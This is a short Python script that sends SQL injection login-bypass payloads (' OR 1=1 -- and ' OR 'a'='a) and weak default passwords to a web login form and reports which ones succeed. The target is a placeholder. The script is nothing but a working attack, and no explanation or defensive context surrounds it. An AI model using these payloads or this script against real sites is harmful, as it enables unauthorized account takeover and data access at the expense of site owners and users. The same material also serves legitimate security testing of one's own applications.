import requests

# Target URL for the login form
url = 'http://example.com/login'  # Replace with actual URL

# List of username and password payloads for testing login bypass
payloads = [
    ('admin', "' OR 1=1 --"),
    ('admin', "' OR 'a'='a"),
    ('admin', 'password'),  # Replace with actual known weak password combinations
    ('user', 'password123')
]

# Loop through username and password combinations
for username, password in payloads:
    print(f"Testing login with username: {username} and password: {password}")
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    
    # Check for successful login (adjust based on actual success message in your app)
    if "Welcome" in response.text:  # Replace with valid success message
        print(f"Login successful with payload: {username}/{password}")
    elif "Invalid" in response.text:  # Replace with actual failure message
        print(f"Login failed with payload: {username}/{password}")
    else:
        print(f"Unhandled response for {username}/{password}")
